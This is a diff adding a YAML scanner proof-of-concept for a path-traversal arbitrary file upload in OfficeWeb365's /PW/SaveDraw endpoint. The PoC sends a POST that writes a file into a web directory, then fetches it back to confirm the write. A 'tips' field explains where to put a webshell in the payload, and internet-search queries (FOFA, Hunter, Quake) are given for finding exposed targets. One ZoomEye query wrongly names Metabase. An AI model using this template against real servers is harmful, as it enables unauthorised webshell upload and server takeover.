@@ -1,0 +1,44 @@
+detail:
+  author: 
+  links:
+    - 
+  vulnerability:
+    level: critical
+    fofa-query: "officeweb365"
+    hunter-query: app.name=="OfficeWeb365"
+    quake-query: app:"officeweb365"
+    zoomeye-query: app:"Metabase"
+    threatbook-query: #
+    cve: 
+    cnvd:
+    tips: （base64,01s34567890123456789y12345678901234567m91）后面webshell  后接  }---
+
+name: poc-yaml-officeweb365-savedraw-upload
+transport: http
+set:
+  s1: randomInt(1000000,9999999)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /PW/SaveDraw?path=../../Content/img&idx={{s1}}.txt
+      follow_redirects: false
+      headers: 
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ASP.NET_SessionId=vayccioy4mobcb3mf5s5og2r
+      body: |
+        data:image/png;base64,01s34567890123456789y12345678901234567m91<{{s1}}>}---
+    expression: >-
+      response.status == 200 && response.body_string.contains("ok")
+  r1:
+    request: 
+      method: GET
+      path: /Content/img/UserDraw/drawPW{{s1}}.txt   
+      follow_redirects: false
+    expression: >-
+      response.status == 200 && response.body_string.contains(string(s1))
+expression: r0() && r1()
